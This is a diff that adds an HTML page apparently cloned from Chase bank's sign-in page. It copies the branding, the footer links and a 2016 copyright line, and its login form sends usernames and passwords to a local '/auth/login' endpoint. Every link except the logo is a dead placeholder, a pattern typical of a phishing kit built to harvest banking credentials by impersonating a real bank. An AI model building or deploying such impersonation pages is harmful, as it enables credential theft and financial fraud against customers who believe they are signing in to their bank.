@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Login</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
+  <script src="/js/jquery.js"></script>
+  <script src="/js/jquery.mask.min.js"></script>
+</head>
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
+  <div class="homepage">
+    <div class="signin-container">
+      <header class="signin header cb transparent bar">
+        <a href="https://secure04ea.chase.com/web/auth/dashboard">
+          <div class="logo"></div>
+        </a>
+      </header>
+
+      <main class="container signin">
+        <div class="cb background image fixed"></div>
+
+        <div class="row">
+          <div class="col-xs-12 col-sm-6 col-sm-offset-3 signin-box">
+            <div class="cb raised segment">
+              <div class="row">
+                <div class="col-xs-10 col-xs-offset-1">
+                  <form method="POST" action="/auth/login">
+                    <div class="cb fieldgroup signin-floating-label" style="margin-top:32px;">
+                      <div class="cb vertical">
+                        <div class="cb-input-container cb-floating-label">
+                          <div class="cb-label-wrapper">
+                            <label class="cb cb-label vertical" for="username">Username</label>
+                          </div>
+
+                          <input id="username" name="username" type="text" class="cb input cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="cb fieldgroup signin-floating-label">
+                      <div class="cb vertical">
+                        <div class="cb-input-container cb-floating-label">
+                          <div class="cb-label-wrapper">
+                            <label class="cb cb-label vertical" for="password">Password</label>
+                          </div>
+
+                          <input id="password" name="password" type="password" class="cb input cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="row ">
+                      <div class="col-xs-6">
+                        <div class="cb checkbox" id="rememberMe">
+                          <div class="checkbox-flex">
+                            <div class="checkboxWrap">
+                              <input class="checkbox-input" type="checkbox" id="rememberMe" value="on">
+                              <i class="cb checkmark icon check"></i>
+                            </div>
+
+                            <label for="rememberMe">
+                              <span class="checkbox-label">Remember me</span>
+                            </label>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="row">
+                      <button type="submit" class="cb button focus fluid primary submit-btn">
+                        <span class="label">Sign in</span>
+                      </button>
+                    </div>
+
+                    <div class="row">
+                      <span class="cb link">
+                        <a class="link-anchor" href="javascript:void(0);">
+                          Forgot username/password?
+                          <i class="cb progressright icon end-icon"></i>
+                        </a>
+                      </span>
+                    </div>
+
+                    <div class="row">
+                      <span class="cb link">
+                        <a class="link-anchor last" href="javascript:void(0);">
+                          Not Enrolled? Sign Up Now.
+                          <i class="cb progressright icon end-icon"></i>
+                        </a>
+                      </span>
+                    </div>
+                  </form>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <footer class="signin-footer">
+      <div class="cb-footer">
+        <div class="container">
+          <div class="cb-social-links row">
+            <div class="col-xs-12">
+              <span class="cb-social-text">Follow us:</span>
+
+              <ul class="cb-icon-links"><li class="facebook"><a class="cb iconaction" href="javascript:void(0);"><i class="cb facebook icon"></i></a></li><li class="instagram"><a class="cb iconaction" href="javascript:void(0);"><i class="cb instagram icon"></i></a></li><li class="twitter"><a class="cb iconaction" href="javascript:void(0);"><i class="cb twitter icon"></i></a></li><li class="youtube"><a class="cb iconaction" href="javascript:void(0);"><i class="cb youtube icon"></i></a></li><li class="linkedin"><a class="cb iconaction" href="javascript:void(0);"><i class="cb linkedin icon"></i></a></li></ul>
+            </div>
+          </div>
+
+          <div class="cb-footer-links row">
+            <div class="col-xs-12">
+              <ul><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Contact us</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Privacy</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Security</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Terms of use</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Accessibility</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">SAFE Act: Chase Mortgage Loan Originators</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Fair Lending</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">About Chase</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">J.P. Morgan</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">JPMorgan Chase & Co.</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Careers</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Español</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Chase Canada</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Site map</a></span></li><li>Member FDIC</li><li><i class="cb equal-housing-lender icon"></i>Equal Housing Lender </li><li class="copyright-label">(c) 2016 JPMorgan Chase &amp; Co.</li></ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="/js/main.js"></script>
+</body>
+
+</html>
